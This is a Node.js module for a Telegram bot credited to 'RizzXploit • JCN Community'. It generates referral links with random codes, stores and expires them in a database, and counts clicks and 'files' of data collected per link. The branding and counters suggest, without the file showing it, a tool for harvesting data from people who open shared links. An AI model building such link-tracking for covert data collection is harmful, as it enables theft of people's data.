const db = require('../database/db');
const crypto = require('crypto');

class LinkHandler {
  
  // Generate shareable link
  async generateShareLink(chatId, linkType = 'member') {
    try {
      const [users] = await db.query(
        'SELECT * FROM users WHERE user_id = ?',
        [chatId.toString()]
      );
      
      if (users.length === 0) {
        global.bot.sendMessage(chatId,
          `❌ User tidak ditemukan.\n\n🔧 *Bot by RizzXploit • JCN Community*`,
          { parse_mode: 'Markdown' }
        );
        return;
      }

      // Generate unique link code
      const linkCode = crypto.randomBytes(8).toString('hex');
      const websiteUrl = process.env.WEBSITE_URL || 'https://your-website.vercel.app';
      
      const shareableLink = `${websiteUrl}/?ref=${chatId}&code=${linkCode}&type=${linkType}`;

      // Save to database
      await db.query(
        `INSERT INTO links (link_code, user_id, link_type, expires_at) 
         VALUES (?, ?, ?, DATE_ADD(NOW(), INTERVAL 30 DAY))`,
        [linkCode, chatId.toString(), linkType]
      );

      // Update user stats
      await db.query(
        'UPDATE users SET links_shared = links_shared + 1 WHERE user_id = ?',
        [chatId.toString()]
      );

      const linkText = linkType === 'premium' ? 
        `💎 **LINK VVIP BERHASIL DIBUAT**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n` :
        `🌐 **LINK BERHASIL DIBUAT**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;

      const message = linkText +
        `🔗 Link: ${shareableLink}\n\n` +
        `📊 Link ini sudah digunakan: 0x\n` +
        `💾 Data terkumpul: 0 files\n` +
        `⏰ Expires: ${new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toLocaleDateString('id-ID')}\n\n` +
        `🔧 *Bot by RizzXploit • JCN Community*`;

      global.bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });

    } catch (error) {
      console.error('Error generating link:', error);
      global.bot.sendMessage(chatId,
        `❌ Gagal membuat link: ${error.message}\n\n🔧 *Bot by RizzXploit • JCN Community*`,
        { parse_mode: 'Markdown' }
      );
    }
  }

  // Generate member link
  async generateMemberLink(chatId) {
    await this.generateShareLink(chatId, 'member');
  }

  // Generate premium link
  async generatePremiumLink(chatId) {
    await this.generateShareLink(chatId, 'premium');
  }

  // Validate link when accessed from website
  async validateLink(linkCode, referringUserId) {
    try {
      const [links] = await db.query(
        'SELECT * FROM links WHERE link_code = ? AND is_active = TRUE',
        [linkCode]
      );

      if (links.length === 0) {
        return { valid: false, error: 'Link tidak valid atau sudah expired' };
      }

      const link = links[0];

      if (link.expires_at && new Date() > new Date(link.expires_at)) {
        await db.query(
          'UPDATE links SET is_active = FALSE WHERE link_code = ?',
          [linkCode]
        );
        return { valid: false, error: 'Link sudah expired' };
      }

      // Update link stats
      await db.query(
        'UPDATE links SET click_count = click_count + 1 WHERE link_code = ?',
        [linkCode]
      );

      return { 
        valid: true, 
        linkType: link.link_type,
        ownerUserId: link.user_id,
        referringUserId: referringUserId
      };

    } catch (error) {
      console.error('Error validating link:', error);
      return { valid: false, error: error.message };
    }
  }

  // Update link data count
  async updateLinkDataCount(linkCode) {
    try {
      await db.query(
        'UPDATE links SET data_collected = data_collected + 1 WHERE link_code = ?',
        [linkCode]
      );
      return true;
    } catch (error) {
      console.error('Error updating link count:', error);
      return false;
    }
  }

  // Invite user system
  async generateInviteCode(chatId) {
    try {
      const inviteCode = crypto.randomBytes(6).toString('hex').toUpperCase();
      
      const message = `📨 **INVITE CODE BERHASIL DIBUAT**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `🔐 Kode: ${inviteCode}\n\n` +
        `Bagikan kode ini ke teman Anda untuk bergabung.\n` +
        `Kode akan expired dalam 7 hari.\n\n` +
        `🔧 *Bot by RizzXploit • JCN Community*`;

      global.bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });

    } catch (error) {
      console.error('Error generating invite code:', error);
      global.bot.sendMessage(chatId,
        `❌ Gagal membuat invite code: ${error.message}\n\n🔧 *Bot by RizzXploit • JCN Community*`,
        { parse_mode: 'Markdown' }
      );
    }
  }
}

module.exports = new LinkHandler();
